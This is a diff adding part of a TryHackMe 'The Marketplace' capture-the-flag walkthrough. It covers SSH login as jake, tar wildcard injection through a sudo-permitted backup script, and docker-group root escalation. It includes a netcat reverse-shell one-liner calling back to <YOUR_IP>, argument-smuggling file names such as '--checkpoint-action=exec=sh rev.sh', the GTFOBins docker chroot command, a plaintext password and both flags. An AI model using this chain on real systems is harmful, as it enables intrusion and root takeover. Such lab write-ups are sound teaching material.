@@ -86,3 +86,88 @@ and needs to be changed. You have been generated a new temporary password.
 ```
 
 T﻿his message was sent to user with id `3`, which we can lookup in the users table and find out that it belongs to the user `jake`
+
+Let's now log in as Jake via SSH and get the user flag. Typing `sudo -l` will tell us what programs we can run and as what users - this is a good command to memorize for privilege escalation
+
+```shell
+ssh jake@10.10.15.67
+jake@10.10.15.67 s password: @b_ENXkGYUCAv3zJ 
+jake@10.10.15.57$ cat user.txt
+THM{c3648ee7af1369676e3e4b15da6dc0b4}
+jake@10.10.15.67$ sudo -l
+...
+User jake may run the following commands on the-marketplace
+  (michael) NOPASSWD: /opt/backups/backup.sh
+```
+
+ This tells us that our user (jake) can run the bash script at `/opt/backups/backup.sh` as the user `michael`
+
+Let's take a look at the bash script:
+
+```shell
+jake@10.10.15.67:/opt/backups$ cat backup.sh
+#!/bin/bash
+echo "Backing up files...";
+tar cf /opt/backups/backup.tar *
+```
+
+The script takes a backup of everything in the /opt/backup directory by using wildcard packing, after research online I found that this can be exploited ([reference](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)). It works by creating empty files in the backup directory which are actually named the same as command arguments for the `tar `command. For a full explanation of the exploit, read the reference, but below are the commands used.
+
+```shell
+jake@10.10.15.67$ cat > /opt/backups/rev.sh << EOF
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR_IP> 5555 >/tmp/f
+EOF
+jake@10.10.15.67$ chmod 777 /opt/backups/rev.sh
+jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint=1"
+jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint-action=exec=sh rev.sh"
+jake@10.10.15.67$ cd /opt/backups; sudo -u michael /opt/backups/backup.sh
+
+```
+
+Note: you will need to start a shell listener using `nc -lvp 5555`
+
+Now, in your shell, you should get a callback
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 5555
+listening on [any] 5555
+connect to [10.10.15.67] from (UNKNOWN) [<YOUR_IP>] 53896
+michael@10.10.15.67:/opt/backups$ whoami
+michael
+michael@10.10.15.67:/opt/backups$ id
+uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
+
+```
+
+From the `id `command, we can see michael is part of the docker group, let's look at GTFOBins for a docker root escalation. ([GTFOBins](https://gtfobins.github.io/gtfobins/docker/))
+
+A good thing to always do when you have a 'crappy' shell over netcat is to upgrade it (make interactive). In fact, the docker exploit will not work if the input device is not a TTY. Commands to upgrade the shell are as follows:
+
+```shell
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+# CTRL + Z
+$ stty raw -echo; fg
+# ENTER
+export TERM=xterm-256color
+```
+
+GTFObins gives us the following command: 
+
+```shell
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+Let's run that, and we get a root shell!
+
+```
+michael@the-marketplace$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+...
+# whoami
+root
+# cat /root/root.txt
+THM{d4f76179c80c0dcf46e0f8e43c9abd62}
+```
+
+Kind of an easy win for the root flag, I would have liked something more challenging but we will take it!
